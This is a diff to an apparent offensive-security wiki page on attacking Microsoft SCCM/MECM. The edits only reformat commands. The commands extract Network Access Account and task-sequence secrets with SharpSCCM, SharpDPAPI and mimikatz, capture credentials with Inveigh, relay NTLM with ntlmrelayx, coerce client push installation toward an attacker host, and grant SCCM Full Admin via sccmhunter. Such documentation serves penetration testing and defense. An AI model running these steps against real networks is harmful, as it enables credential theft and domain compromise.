@@ -50,7 +50,7 @@ Step 1: Gain control over a computer account password.
 For this step, it is possible to create a new computer account (if permited by the domain policy), instead of compromise a domain computer.
 
 ```bash
-python3 addcomputer.py -dc-ip $DC -computer-name controlledComputer$ -computer-pass controlledPassword $DOMAIN/$USER:$PASSWORD
+addcomputer.py -dc-ip $DC -computer-name controlledComputer$ -computer-pass controlledPassword $DOMAIN/$USER:$PASSWORD
 ```
 
 Step 2: Use `sccmwtf.py` to extract NAA secrets
@@ -78,7 +78,7 @@ Step 4: Decode obfuscated strings
 To decode username and password use `.\DeobfuscateSecretString.exe` contained in [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) or [sccmwtf](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.c)
 
 ````powershell
-.\policysecretdecrypt.exe $HEX_STRING
+policysecretdecrypt.exe $HEX_STRING
 ````
 
 Alternatively, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) automates all the attack with, or without, an already controlled computer accounts. For this purpose, the `http` module uses the result from the `find` command and enumerates the remote hosts for SCCM/MECM enrollment web services. If it finds one, it performs [Adam Chester](https://twitter.com/\_xpn\_)'s attack for the specified computer account. If no account is already under control, the `-auto` flag can be indicated to create a new computer account.
@@ -100,16 +100,16 @@ From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://git
 Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
 
 # Extracting from CIM store
-.\SharpSCCM.exe local secretes disk
+SharpSCCM.exe local secretes disk
 
 # Extracting from WMI
-.\SharpSCCM.exe local secretes wmi
+SharpSCCM.exe local secretes wmi
 
 # Using SharpDPAPI
-.\SharpDPAPI.exe SCCM
+SharpDPAPI.exe SCCM
 
 # Using mimikatz
-.\mimikatz.exe
+mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # dpapi::sccm
@@ -118,7 +118,7 @@ mimikatz # dpapi::sccm
 SharpSCCM also permits to request the SCCM policy remotely to retrieve the NAA credentials inside.
 
 ```powershell
-.\SharpSCCM.exe get secretes
+SharpSCCM.exe get secretes
 ```
 {% endtab %}
 {% endtabs %}
@@ -137,17 +137,20 @@ From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://git
 
 ```powershell
 # Locally from WMI 
+
 Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
+
 # Extracting from CIM store
-.\SharpSCCM.exe local secrets -m disk
+SharpSCCM.exe local secrets -m disk
+
 # Extracting from WMI
-.\SharpSCCM.exe local secrets -m wmi
+SharpSCCM.exe local secrets -m wmi
 ```
 
 SharpSCCM also permits to request the SCCM policy remotely to retrieve the NAA credentials inside.
 
 ```powershell
-.\SharpSCCM.exe get secrets
+SharpSCCM.exe get secrets
 ```
 {% endtab %}
 {% endtabs %}
@@ -166,11 +169,14 @@ From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://git
 
 ```powershell
 # Locally from WMI 
+
 Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
+
 # Locally from CIM store
-.\SharpSCCM.exe local secrets -m disk
+SharpSCCM.exe local secrets -m disk
+
 # Locally from WMI
-.\SharpSCCM.exe local secrets -m wmi
+SharpSCCM.exe local secrets -m wmi
 ```
 {% endtab %}
 {% endtabs %}
@@ -188,8 +194,8 @@ The client push installation can be triggered forcefully or - if you're lucky - 
 **Option 1: Wait for Client Push Installation**
 
 ```powershell
-## Credential capture using Inveigh 
-PS:> .\Inveigh.exe
+# Credential capture using Inveigh 
+Inveigh.exe
 ```
 
 **Option 2: Forcefully "coerce" the Client Push Installation**
@@ -205,19 +211,22 @@ Note that you could either capture & crack received credentials or relay them to
 ```sh
 # On Linux
 ## Relay using ntlmrelayx.py
-$:> python3 examples/ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
+ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
+```
+```powershell
 # On Windows
 ## Credential capture using Inveigh 
-PS:> .\Inveigh.exe
+Inveigh.exe
 ```
 
 **Step 2: Trigger Client-Push Installation**
 
 ```PowerShell
-## If admin access over Management Point (MP)
-PS:> .\SharpSCCM.exe invoke client-push -t <AttackerServer> --as-admin
-## If not MP admin
-PS:> .\SharpSCCM.exe invoke client-push -t <AttackerServer>
+# If admin access over Management Point (MP)
+SharpSCCM.exe invoke client-push -t <AttackerServer> --as-admin
+
+# If not MP admin
+SharpSCCM.exe invoke client-push -t <AttackerServer>
 ```
 
 **Step 3: Cleanup**
@@ -303,7 +312,7 @@ From Windows systems, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can
 
 ```
 # this should be run on the windows SCCM client as the user (no need for admin privileges here)
-.\SharpSCCM.exe get user-sid
+SharpSCCM.exe get user-sid
 ```
 {% endtab %}
 {% endtabs %}
@@ -346,7 +355,7 @@ There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` 
 {% tab title="Windows" %}
 {% code overflow="wrap" %}
 ```powershell
-.\SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "<site_code>" -t "attacker.domain.local"
+SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "<site_code>" -t "attacker.domain.local"
 ```
 {% endcode %}
 {% endtab %}
@@ -432,7 +441,7 @@ There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` 
 
 {% tab title="Windows" %}
 ```powershell
-.\SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "<site_code>" -t "attacker.domain.local"
+SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "<site_code>" -t "attacker.domain.local"
 ```
 {% endtab %}
 {% endtabs %}
@@ -443,7 +452,7 @@ It is then possible to verify the new privileges on SCCM.
 
 ```powershell
 # this should be run on the windows SCCM client as the user that was just given full administrative role to 
-.\SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc "<site_code>"
+SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc "<site_code>"
 ```
 
 #### Relay from a passive site server to the active site server
@@ -497,7 +506,7 @@ Retrieve the LM:NT hash of the server account.
 Since the active site server must be a member of the SMS Provider administrators (it is member of the `SMS Admins` group), its credentials can be used to add a new controlled user to the `Full Admin` SCCM group. [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used for this purpose.
 
 ```bash
-python3 sccmhunter.py admin -u $ACTIVE_SERVER\$ -p $LMHASH:NTHASH -ip $SMS_PROVIDER_IP
+sccmhunter.py admin -u $ACTIVE_SERVER\$ -p $LMHASH:NTHASH -ip $SMS_PROVIDER_IP
 
 () (C:\) >> add_admin controlledUser <controlledUser_SID>
 () (C:\) >> show_admins
